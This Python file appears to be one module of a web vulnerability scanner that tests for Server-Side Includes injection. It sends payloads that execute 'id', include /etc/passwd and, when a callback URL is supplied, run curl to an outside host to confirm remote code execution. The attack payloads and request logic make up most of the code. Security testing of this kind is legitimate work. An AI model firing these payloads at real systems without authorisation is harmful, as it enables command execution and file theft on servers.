#!/usr/bin/env python3
"""SSI Injection Tester

Tests for Server-Side Includes (SSI) injection vulnerabilities:
- SSI injection in templates/static content
- Command execution via SSI
- File inclusion via SSI
"""

import os
import time
import requests
from typing import Dict, Any, Optional
from urllib.parse import urlparse


def test_ssi_injection(
    target_url: str,
    param: str = "page",
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for SSI injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "ssi_injection",
        "vulnerable": False,
        "injection_method": None,
        "rce_confirmed": False,
        "evidence": None
    }
    
    # SSI injection payloads
    ssi_payloads = [
        ("<!--#exec cmd=\"id\"-->", "ssi_exec_cmd"),
        ("<!--#include file=\"/etc/passwd\"-->", "ssi_include_file"),
        ("<!--#echo var=\"DOCUMENT_NAME\"-->", "ssi_echo_var"),
        ("<!--#config timefmt=\"%A\"-->", "ssi_config"),
    ]
    
    # Add callback-based payloads if callback URL provided
    if callback_url:
        ssi_payloads.append(
            (f"<!--#exec cmd=\"curl {callback_url}\"-->", "ssi_exec_callback")
        )
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    for payload, payload_name in ssi_payloads:
        try:
            # Try GET
            resp = requests.get(
                base_url,
                params={param: payload},
                timeout=10
            )
            
            # Check for SSI execution indicators
            response_lower = resp.text.lower()
            ssi_indicators = ["uid=", "gid=", "root:", "bin/bash"]
            
            if any(ind in response_lower for ind in ssi_indicators):
                result["vulnerable"] = True
                result["injection_method"] = payload_name
                if "exec" in payload_name:
                    result["rce_confirmed"] = True
                result["evidence"] = {
                    "payload": payload,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "note": "SSI injection detected"
                }
                break
                
        except Exception:
            continue
    
    return result


def validate_ssi_injection(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for SSI injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Initialize callback if available
    callback_url = None
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"ssi_injection_{int(time.time())}"
            token = correlator.register_job(job_id, "ssi_injection", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
        except Exception:
            pass
    
    test_result = test_ssi_injection(target, callback_url=callback_url)
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="SSI Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", default="page", help="Parameter to test")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    result = test_ssi_injection(args.target, param=args.param, callback_url=None)
    
    import json
    print(json.dumps(result, indent=2))

